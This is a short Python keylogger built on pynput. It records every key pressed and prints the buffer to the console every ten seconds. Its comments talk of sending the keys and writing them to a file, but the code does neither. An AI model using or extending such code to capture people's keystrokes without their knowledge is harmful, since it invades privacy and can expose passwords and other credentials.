from pynput import keyboard
#for seetting timer , we need to use threading library
import threading

text = ""
interval = 10 # Time interval in seconds

# Function to send the key pressed to a file
def send():
    global text

    try:
        print(text)
        text = ""
        timer = threading.Timer(interval, send)
        timer.start()
    except:
        print("Error in sending text")
   

# Function to write the key pressed to a file
def on_press(key):
    global text 
    
    text += str(key)


with keyboard.Listener(on_press=on_press) as listener:
    
    send() # Start sending the text every interval seconds
    listener.join()# Keep the listener running